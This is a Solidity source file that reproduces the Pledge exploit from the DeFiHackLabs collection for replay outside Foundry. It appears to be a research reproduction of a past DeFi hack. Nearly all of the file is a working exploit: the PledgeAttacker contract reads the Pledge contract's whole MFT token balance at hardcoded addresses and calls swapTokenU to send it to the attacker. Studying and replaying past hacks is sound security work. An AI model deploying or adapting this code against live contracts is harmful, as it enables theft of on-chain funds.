// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Standalone reproduction for the EVM Playground — mirrors the DeFiHackLabs
// Pledge_exp.sol test's testExploit() logic verbatim, but without inheriting
// forge-std Test/BaseTestWithBalanceLog (which depends on the Foundry
// cheatcode contract being deployed; that address has no code in a plain EVM
// replay, so any cheatcode-gated modifier reverts before the real attack
// logic runs).

address constant pledge = 0x061944c0f3c2d7DABafB50813Efb05c4e0c952e1;
address constant MFT = 0x4E5A19335017D69C986065B21e9dfE7965f84413;

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
}

interface IPledge {
    function swapTokenU(uint256 amount, address _target) external;
}

contract PledgeAttacker {
    function testExploit() external {
        uint256 amount = IERC20Min(MFT).balanceOf(pledge);
        address _target = address(this);
        IPledge(pledge).swapTokenU(amount, _target);
    }
}
